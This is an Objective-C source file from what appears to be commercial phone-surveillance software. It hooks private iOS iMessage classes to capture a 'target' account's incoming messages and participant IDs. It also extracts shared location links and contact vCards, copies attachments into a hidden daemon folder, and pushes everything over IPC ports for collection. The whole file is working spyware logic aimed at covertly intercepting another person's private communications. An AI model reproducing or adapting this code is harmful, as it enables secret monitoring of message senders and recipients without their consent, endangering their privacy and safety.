//
//  IMessageUtils.m
//  MSFSP
//
//  Created by Makara Khloth on 7/17/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "IMessageUtils.h"
#import "MessagePortIPCSender.h"
#import "DefStd.h"
#import "DaemonPrivateHome.h"
#import "DateTimeFormat.h"

#import "FxIMEvent.h"
#import "FxAttachment.h"
#import "FxRecipient.h"

#import "IMMessage.h"
#import "IMFileTransferCenter.h"
#import "IMFileTransfer.h"
#import "IMHandle.h"
#import "IMHandle+IOS6.h"
#import "IMAccount.h"
#import "IMAccount+IOS6.h"
#import "IMChat.h"
#import "IMChat+IOS6.h"
#import "IMChat+iOS8.h"

#import "ABVCardRecord.h"
#import "ABVCardExporter.h"
#import "IMShareUtils.h"

#import <objc/runtime.h>
#import <AddressBook/ABRecord.h>
#import <AddressBook/ABPerson.h>

static IMessageUtils *_IMessageUtils = nil;

@interface IMessageUtils (private)

+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName;
+ (void) sendCopyEvent: (FxIMEvent *) aCopyEvent;

- (void) thread: (NSDictionary *) aUserInfo;
- (void) fillAttachments: (IMMessage *) aIMMessage toEvent: (FxIMEvent *) aIMEvent;
- (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray;

@end


@implementation IMessageUtils

@synthesize mLastMessageID;

+ (IMessageUtils *) shareIMessageUtils {
	if (_IMessageUtils == nil) {
		_IMessageUtils = [[IMessageUtils alloc] init];
	}
	return (_IMessageUtils);
}

/**
 - Method name:						sendData:
 - Purpose:							This method is used to Write iMessage information into the iMessage Ports. 
 Load balance is applied
 - Argument list and description:	aData (NSData)
 - Return description:				Return boolean true if sucess otherwise false
 */

+ (BOOL) sendData: (NSData *) aData {
	BOOL successfully = NO;
	if (!(successfully = [IMessageUtils sendDataToPort:aData portName:kiMessageMessagePort1])) { // Load balance
		DLog (@"First sending fail");
		successfully = [IMessageUtils sendDataToPort:aData portName:kiMessageMessagePort2];
		if (!successfully) {
			DLog (@"Second sending also fail");
		}
	}
	return (successfully);
}

+ (void) captureAttachmentsAndSendFromMessage: (IMMessage *) aMessage toEvent: (FxIMEvent *) aIMEvent {
	IMessageUtils *iMessageUtils = [[IMessageUtils alloc] init];
	NSMutableDictionary *userInfo = [[NSMutableDictionary alloc] init];
	[userInfo setObject:aIMEvent forKey:@"IMEvent"];
	[userInfo setObject:aMessage forKey:@"IMMessage"];
	
	[NSThread detachNewThreadSelector:@selector(thread:) toTarget:iMessageUtils withObject:userInfo];
	
	[userInfo release];
	[iMessageUtils release];
}

+ (FxIMEvent *) incomingIMEventWithChat: (IMChat *) aIMChat message: (IMMessage *) aIMMessage {
    IMMessage *message = aIMMessage;
    NSString *msg = [message summaryString];
    DLog (@"================ >>>>>> text: %@", msg)
    
    //---------------------- Partipcipants --------------------
    NSMutableArray *participants = [NSMutableArray array];
    
    IMHandle *sender = [message sender];
    
    DLog (@"================= sender ================================");
    DLog (@"account         = %@", [sender account]); // It will return target account
    DLog (@"uniqueID        = %@", [[sender account] uniqueID]);
    DLog (@"displayName     = %@", [[sender account] displayName]);
    
    DLog (@"ID              = %@", [sender ID]);
    DLog (@"uniqueName      = %@", [sender uniqueName]);
    DLog (@"name            = %@", [sender name]);
    DLog (@"fullName        = %@", [sender fullName]);
    DLog (@"nameAndID       = %@", [sender nameAndID]);
    DLog (@"normalizedID    = %@", [sender normalizedID]);
    DLog (@"displayID       = %@", [sender displayID]);
    DLog (@"================= sender ================================");
    
    /*****************************************************************************
     NOTE:
     
     UserID: is a sender of this message
     Partipcipants: is all participants but exclude sender (UserID) of this message
     
     - INCOMING:
     1. Single chat: participant is only one which is the sender of this message
     2. Group chat: participants are all but exclude target account itself
     
     Thus either case we must include target account itself as participant
     
     New IM event structure required:
     - First recipient must be target in the case of incoming IM
     *****************************************************************************/
    
    IMAccount *account = [aIMChat account];
    
    DLog (@"================= account ====================================");
    DLog (@"login           = %@", [account login]);
    DLog (@"ID              = %@", [[account loginIMHandle] ID]);
    DLog (@"loginDisplayID  = %@", [[account loginIMHandle] displayID]);
    DLog (@"loginName       = %@", [[account loginIMHandle] name]);
    DLog (@"myStatusMessage = %@", [account myStatusMessage]);
    DLog (@"myPictureData   = %@", [account myPictureData]);
    DLog (@"uniqueID        = %@", [account uniqueID]);
    DLog (@"displayName     = %@", [account displayName]);
    DLog (@"name            = %@", [account name]);
    DLog (@"internalName    = %@", [account internalName]);
    DLog (@"shortName       = %@", [account shortName]);
    DLog (@"================= account ====================================");
    
    DLog (@"================= aIMChat ====================================");
    DLog (@"roomName        = %@", [aIMChat roomName]);
    DLog (@"guid            = %@", [aIMChat guid]);
    DLog (@"================= aIMChat ====================================");
    
    /***************************************************************************/
    /*  This information must match to one of participants in outgoing case    */
    /***************************************************************************/
    
    FxRecipient *participant = [[FxRecipient alloc] init];
    [participant setRecipNumAddr:[[account loginIMHandle] ID]]; // p:08xx or e:forum.this@gmail.com
    [participant setRecipContactName:[[account loginIMHandle] displayID]];
    [participants addObject:participant];
    [participant release];
    
    DLog (@"Participants of this chat = %@", [aIMChat participants]);
    
    for (IMHandle *participantIM in [aIMChat participants]) {
        DLog (@"================= participant IN ====================");
        DLog (@"name         = %@", [participantIM name]);
        DLog (@"displayID    = %@", [participantIM displayID]);
        DLog (@"ID           = %@", [participantIM ID]);
        DLog (@"================= participant IN ====================");
        
        // Participant's displayID/name must not equal to sender's displayID/name
        if (![[sender displayID] isEqualToString:[participantIM displayID]] ||
            ![[sender name] isEqualToString:[participantIM name]]) {
            NSString *displayID = [participantIM displayID];
            NSString *numberAddress = [displayID stringByReplacingOccurrencesOfString:@"-" withString:@""];
            
            // This information must match to all participants in outgoing method
            FxRecipient *participant = [[FxRecipient alloc] init];
            [participant setRecipNumAddr:numberAddress];
            //[participant setRecipNumAddr:[participantIM displayID]];// +668xxx (some time)
            [participant setRecipContactName:[participantIM name]]; // Contact name or 08xxx
            [participants addObject:participant];
            [participant release];
        }
    }
    
    /***************************************************************************/
    /*  This information must match to one of participants in outgoing case    */
    /***************************************************************************/
    
    NSString *displayID = [sender displayID];
    NSString *userId = [displayID stringByReplacingOccurrencesOfString:@"-" withString:@""];
    NSString *displayName = [sender name];
    
    FxIMEvent *imEvent = [[FxIMEvent alloc] init];
    [imEvent setMIMServiceID:kIMServiceIDiMessage];
    [imEvent setMDirection:kEventDirectionIn];
    [imEvent setMMessage:msg];
    [imEvent setMUserID:userId];
    [imEvent setMUserDisplayName:displayName];
    
    // Conversation ID (key point to make conversion ID the same over again and again is that the order of recipients in the array must be same)
    NSString * conversationId = nil;
    for (int i = 0; i < [[aIMChat participants]count]; i++){
        IMHandle * handle = [[aIMChat participants]objectAtIndex:i];
        if (i == 0){
            conversationId = [NSString stringWithFormat:@"%@",[handle ID]];
        } else {
            conversationId = [NSString stringWithFormat:@"%@,%@",conversationId,[handle ID]];
        }
    }
    DLog(@"conversationId %@",conversationId);
    
    // Chat name
    NSString * chatIdentifier = nil;
    for (int i = 0; i < [[aIMChat participants]count]; i++){
        IMHandle * handle = [[aIMChat participants]objectAtIndex:i];
        if (i == 0){
            chatIdentifier = [NSString stringWithFormat:@"%@",[handle name]];
        } else {
            chatIdentifier = [NSString stringWithFormat:@"%@,%@",chatIdentifier,[handle name]];
        }
    }
    // Handle name will return +668xxx for single chat (unlike outgoing which is 08xxx)
    DLog(@"ChatIdentifier %@",chatIdentifier);
    
    [imEvent setMParticipants:participants];
    [imEvent setMAttachments:[NSArray array]];
    [imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
    
    // New fields...
    [imEvent setMServiceID:kIMServiceiMessage];
    [imEvent setMConversationID:conversationId];
    [imEvent setMConversationName:chatIdentifier];
    [imEvent setMRepresentationOfMessage:(kIMMessageText | kIMMessageNone)];
    
    return ([imEvent autorelease]);
}

+ (FxIMEvent *) outgoingIMEventWithChat: (IMChat *) aIMChat message: (IMMessage *) aIMMessage {
    return nil;
}

#pragma mark -
#pragma mark Private methods
#pragma mark -

+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName {
	BOOL successfully = FALSE;
	MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
	successfully = [messagePortSender writeDataToPort:aData];
	[messagePortSender release];
	messagePortSender = nil;
	return (successfully);
}

+ (void) sendCopyEvent: (FxIMEvent *) aCopyEvent {
	NSMutableData* data = [[NSMutableData alloc] init];
	NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
	[archiver encodeObject:aCopyEvent forKey:kiMessageArchived];
	[archiver finishEncoding];
	
	BOOL SendSuccess = [IMessageUtils sendData:data];
	if(!SendSuccess){
		[[self shareIMessageUtils] deleteAttachmentFileAtPathForEvent:[aCopyEvent mAttachments]];
	}
	
	[archiver release];
	[data release];
}

- (void) thread: (NSDictionary *) aUserInfo {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	@try {
		FxIMEvent *imEvent = [aUserInfo objectForKey:@"IMEvent"];
		IMMessage *imMessage = [aUserInfo objectForKey:@"IMMessage"];
		
		DLog(@"imEvent = %@", imEvent)
		DLog(@"imMessage = %@", imMessage)
		
		[self fillAttachments:imMessage toEvent:imEvent];
		
		NSMutableData* data = [[NSMutableData alloc] init];
		NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
		[archiver encodeObject:imEvent forKey:kiMessageArchived];
		[archiver finishEncoding];
		
		BOOL SendSuccess = [IMessageUtils sendData:data];
		if(!SendSuccess){
			[self deleteAttachmentFileAtPathForEvent:[imEvent mAttachments]];
		}
		
		[archiver release];
		[data release];
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	[pool release];
}

- (void) fillAttachments: (IMMessage *) aIMMessage toEvent: (FxIMEvent *) aIMEvent {
	
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	IMMessage *message = aIMMessage;
	
	Class $IMFileTransferCenter = objc_getClass("IMFileTransferCenter");
	IMFileTransferCenter * imfilecenter = [$IMFileTransferCenter sharedInstance];
	id imfilereturn = [imfilecenter transferForGUID:[[message fileTransferGUIDs]objectAtIndex:0] includeRemoved:YES];
	IMFileTransfer * imfile = (IMFileTransfer *)imfilereturn;
	
	NSRange checktype = [[imfile filename] rangeOfString:@".vcf" options:NSCaseInsensitiveSearch];
	
	// -- CASE 1: VCF FILE
	if (checktype.location != NSNotFound) {
		NSRange seperate = [[imfile filename] rangeOfString:@"loc.vcf" options:NSCaseInsensitiveSearch];

		// -- CASE 1.1: LOCATION VCF
		if (seperate.location != NSNotFound) {
			DLog(@"******************** Loc Found string");
			NSString* googleurl =@"";
			NSString* address   =@"";
			// Extract vcf to String
			NSString *filePath = [imfile localPath];
			NSString *vCardString = [NSString stringWithContentsOfFile:filePath encoding:NSUTF8StringEncoding error:nil ];
			DLog(@"vCardString %@",vCardString);
			// Use regular to get mapurl
			NSArray * extactvCard = [vCardString componentsSeparatedByString:@"\n"];
			for (int i =0; i< [extactvCard count]; i++) {
				
				if([[extactvCard objectAtIndex:i] rangeOfString:@".ADR;" options:NSCaseInsensitiveSearch].location != NSNotFound){
					DLog(@"*** address line %@",[extactvCard objectAtIndex:i]);
					NSString *removesymbol = [[extactvCard objectAtIndex:i]  stringByReplacingOccurrencesOfString:@";"withString:@" "];
					DLog(@"*** removesymbol %@",removesymbol);
					NSArray * extactonlcharacter = [removesymbol componentsSeparatedByString:@":"];
					DLog(@"*** extactonlcharacter %@",extactonlcharacter);
					address = [extactonlcharacter objectAtIndex:1];
					DLog(@"*** address %@ ",address);
				}
				
				if([[extactvCard objectAtIndex:i] rangeOfString:@"http://maps" options:NSCaseInsensitiveSearch].location != NSNotFound){
					
					DLog(@"*** url line %@",[extactvCard objectAtIndex:i]);
					NSArray * extactonlyurl = [[extactvCard objectAtIndex:i] componentsSeparatedByString:@"http:"];
					DLog(@"*** extactonlyurl %@",extactonlyurl);
					for (int j =0; j< [extactonlyurl count]; j++) {
						if([[extactonlyurl objectAtIndex:j] rangeOfString:@"//maps" options:NSCaseInsensitiveSearch].location != NSNotFound){
							googleurl = [NSString stringWithFormat:@"http:%@",[extactonlyurl objectAtIndex:j]];
							DLog(@"*** url %@ ",googleurl);
						}
					}
				}				
			}
            
            // iOS 8, apple map, http://maps.apple.com/?ll=13.756858\,100.541700 , we need to delete backslash
            googleurl = [googleurl stringByReplacingOccurrencesOfString:@"\\" withString:@""];
            
			if([address length]>0){
				[aIMEvent setMMessage:[NSString stringWithFormat:@"%@\n%@",address,googleurl]];
			}else{
				[aIMEvent setMMessage:[NSString stringWithFormat:@"%@",googleurl]];

			}
			[aIMEvent setMRepresentationOfMessage:kIMMessageText];
			
			DLog(@"address %@, length %lu",address, (unsigned long)[address length]);
			DLog(@"googleurl %@",googleurl);
			
			if ([[message summaryString] length] > 0) {
				// Copy the FxIMEvent to generate one more event which only contains 'text'
				FxIMEvent *copyEvent = [aIMEvent copyWithZone:nil];
				[copyEvent setMMessage:[message summaryString]];
				[IMessageUtils sendCopyEvent:copyEvent];
				[copyEvent release];
			}
		} 
		// -- CASE 1.2: CONTACT VCF
		else {
			DLog(@"******************** Cont Found string");
			
//			NSString *filePath = [imfile localPath];
//			NSString *vCardString = [NSString stringWithContentsOfFile:filePath encoding:NSUTF8StringEncoding error:nil ];										
//			[aIMEvent setMRepresentationOfMessage:kIMMessageContact];
//			[aIMEvent setMMessage:vCardString];			
//			DLog(@"vCardString = %@",vCardString);
			
			// -- Get Vcard from the file first		
			NSAutoreleasePool *pool		= [[NSAutoreleasePool alloc] init];
			
			NSString *filePath			= [imfile localPath];			
			NSData *vCardData			= [NSData dataWithContentsOfFile:filePath];		// -- Get NSData from the file directly											
			NSString *vCardString		= [IMShareUtils getVCardStringFromData:vCardData];
			
			[aIMEvent setMRepresentationOfMessage:kIMMessageContact];
			[aIMEvent setMMessage:vCardString];
			
			if ([[message summaryString] length] > 0) {
				// Copy the FxIMEvent to generate one more event which only contains 'text'
				FxIMEvent *copyEvent = [aIMEvent copyWithZone:nil];
				[copyEvent setMMessage:[message summaryString]];
				[copyEvent setMRepresentationOfMessage:kIMMessageText];
				[IMessageUtils sendCopyEvent:copyEvent];
				[copyEvent release];
			}
			
			[pool drain];
		}
	}
	// -- CASE 2 NON VCF FILE
	else{
		
		NSMutableArray *attachments = [[NSMutableArray alloc] init];
		NSFileManager *fileManager = [[NSFileManager alloc] init];
		
		DLog(@"***************** fileTransferGUIDs %@",[message fileTransferGUIDs]);
		for(int i =0;i<[[message inlineAttachmentAttributesArray]count];i++){

			Class $IMFileTransferCenter = objc_getClass("IMFileTransferCenter");
			IMFileTransferCenter * imfilecenter = [$IMFileTransferCenter sharedInstance];
			id imfilereturn = [imfilecenter transferForGUID:[[message fileTransferGUIDs]objectAtIndex:i] includeRemoved:YES];
			IMFileTransfer * imfile = (IMFileTransfer *)imfilereturn;
			
			NSString* iMessageAttachmentPath    = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imiMessage/"];
			NSString *originpath = [imfile localPath];
			NSString *saveFilePath = [NSString stringWithFormat:@"%@%f%@",iMessageAttachmentPath,[[message time] timeIntervalSince1970],[imfile filename]];
			NSError * error = nil;
			
			DLog(@"File is exist %d",[fileManager fileExistsAtPath:originpath]);
			if ([fileManager fileExistsAtPath:originpath]){ 
				DLog(@"***=================== LocalPath %@",[imfile localPath]);						
				NSDictionary *attr	= [[NSFileManager defaultManager] attributesOfItemAtPath:originpath error:&error];				
				if ([[attr objectForKey:NSFileType] isEqualToString:NSFileTypeSymbolicLink]) {
					//DLog (@"Find symbolic link")
					originpath = [[NSFileManager defaultManager] destinationOfSymbolicLinkAtPath:originpath	error:NULL];
					DLog(@"***=================== LocalPath (fix symbolic link) %@",originpath );
				}
				[fileManager removeItemAtPath:saveFilePath error:&error];
				[fileManager copyItemAtPath:originpath toPath:saveFilePath error:&error];
			}else{
				DLog(@"***===================Data Lost %@",[imfile filename]);
			}
			
			iMessageAttachmentPath = saveFilePath;
			DLog(@"iMessageAttachmentPath at %@",iMessageAttachmentPath);
			
			FxAttachment *attachment = [[FxAttachment alloc] init];	
			[attachment setFullPath:iMessageAttachmentPath];
			[attachments addObject:attachment];			
			[attachment release];
			
		}
		
		[aIMEvent setMAttachments:attachments];
		[attachments release];
		[fileManager release];
		
	}
	
	[pool release];
}

- (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray  {
	for(int i=0;i<[aAttachmentArray count];i++){
		FxAttachment *attachment = (FxAttachment *)[aAttachmentArray objectAtIndex:i];
		NSString *path = [attachment fullPath];
		BOOL deletesuccess = [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
		if(deletesuccess){
			DLog (@"Deleting file %@",path );
		}else{
			DLog (@"Fail deleting file %@",path );
		}
	}
}

@end
